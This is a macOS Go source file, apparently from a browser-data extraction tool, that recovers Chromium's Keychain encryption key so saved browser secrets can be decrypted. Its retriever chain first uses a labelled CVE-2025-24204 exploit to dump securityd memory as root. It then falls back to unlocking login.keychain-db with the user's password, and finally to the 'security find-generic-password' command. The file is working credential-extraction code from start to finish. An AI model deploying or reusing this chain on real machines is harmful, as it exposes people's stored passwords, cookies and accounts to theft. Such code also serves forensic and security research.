//go:build darwin

package keyretriever

import (
	"bytes"
	"context"
	"crypto/sha1"
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/moond4rk/keychainbreaker"
)

// https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_mac.mm;l=157
var darwinParams = pbkdf2Params{
	salt:       []byte("saltysalt"),
	iterations: 1003,
	keySize:    16,
	hashFunc:   sha1.New,
}

// securityCmdTimeout is the maximum time to wait for the security command.
const securityCmdTimeout = 30 * time.Second

// GcoredumpRetriever uses CVE-2025-24204 to extract keychain secrets
// by dumping the securityd process memory. Requires root privileges.
// All keychain records are cached via sync.Once so the memory dump
// happens only once, even when shared across multiple browsers.
type GcoredumpRetriever struct {
	once    sync.Once
	records []keychainbreaker.GenericPassword
	err     error
}

func (r *GcoredumpRetriever) RetrieveKey(storage, _ string) ([]byte, error) {
	r.once.Do(func() {
		r.records, r.err = DecryptKeychainRecords()
		if r.err != nil {
			r.err = fmt.Errorf("gcoredump: %w", r.err)
		}
	})
	if r.err != nil {
		return nil, r.err
	}

	return findStorageKey(r.records, storage)
}

// loadKeychainRecords opens login.keychain-db and unlocks it with the given
// password, returning all generic password records.
func loadKeychainRecords(password string) ([]keychainbreaker.GenericPassword, error) {
	kc, err := keychainbreaker.Open()
	if err != nil {
		return nil, fmt.Errorf("open keychain: %w", err)
	}
	if err := kc.Unlock(keychainbreaker.WithPassword(password)); err != nil {
		return nil, fmt.Errorf("unlock keychain: %w", err)
	}
	return kc.GenericPasswords()
}

// findStorageKey searches keychain records for the given storage account
// and derives the encryption key.
func findStorageKey(records []keychainbreaker.GenericPassword, storage string) ([]byte, error) {
	for _, rec := range records {
		if rec.Account == storage {
			return darwinParams.deriveKey(rec.Password), nil
		}
	}
	return nil, fmt.Errorf("%q: %w", storage, errStorageNotFound)
}

// KeychainPasswordRetriever unlocks login.keychain-db directly using the
// user's macOS login password. No root privileges required.
// The keychain is opened and decrypted only once; subsequent calls
// for different browsers reuse the cached records.
type KeychainPasswordRetriever struct {
	Password string

	once    sync.Once
	records []keychainbreaker.GenericPassword
	err     error
}

func (r *KeychainPasswordRetriever) RetrieveKey(storage, _ string) ([]byte, error) {
	if r.Password == "" {
		return nil, fmt.Errorf("keychain password not provided")
	}

	r.once.Do(func() {
		r.records, r.err = loadKeychainRecords(r.Password)
	})
	if r.err != nil {
		return nil, r.err
	}

	return findStorageKey(r.records, storage)
}

// SecurityCmdRetriever uses macOS `security` CLI to query Keychain.
// This may trigger a password dialog on macOS. Results are cached
// per storage name so each browser's key is fetched only once.
type SecurityCmdRetriever struct {
	mu    sync.Mutex
	cache map[string]securityResult
}

type securityResult struct {
	key []byte
	err error
}

func (r *SecurityCmdRetriever) RetrieveKey(storage, _ string) ([]byte, error) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if res, ok := r.cache[storage]; ok {
		return res.key, res.err
	}

	key, err := r.retrieveKeyOnce(storage)
	r.cache[storage] = securityResult{key: key, err: err}
	return key, err
}

func (r *SecurityCmdRetriever) retrieveKeyOnce(storage string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), securityCmdTimeout)
	defer cancel()

	var stdout, stderr bytes.Buffer
	cmd := exec.CommandContext(ctx, "security", "find-generic-password", "-wa", strings.TrimSpace(storage)) //nolint:gosec
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
			return nil, fmt.Errorf("security command timed out after %s", securityCmdTimeout)
		}
		return nil, fmt.Errorf("security command: %w (%s)", err, strings.TrimSpace(stderr.String()))
	}
	if stderr.Len() > 0 {
		return nil, fmt.Errorf("keychain: %s", strings.TrimSpace(stderr.String()))
	}

	secret := bytes.TrimSpace(stdout.Bytes())
	if len(secret) == 0 {
		return nil, fmt.Errorf("keychain: empty secret for %s", storage)
	}

	return darwinParams.deriveKey(secret), nil
}

// DefaultRetrievers returns the macOS Retrievers. macOS has only a V10 tier (v11 and v20 cipher
// prefixes are not used by Chromium on this platform), populated by a within-tier first-success
// chain tried in order:
//
//  1. GcoredumpRetriever       — CVE-2025-24204 exploit (root only)
//  2. KeychainPasswordRetriever — direct unlock, skipped when password is empty
//  3. SecurityCmdRetriever      — `security` CLI fallback (may trigger a dialog)
func DefaultRetrievers(keychainPassword string) Retrievers {
	chain := []KeyRetriever{&GcoredumpRetriever{}}
	if keychainPassword != "" {
		chain = append(chain, &KeychainPasswordRetriever{Password: keychainPassword})
	}
	chain = append(chain, &SecurityCmdRetriever{cache: make(map[string]securityResult)})
	return Retrievers{V10: NewChain(chain...)}
}
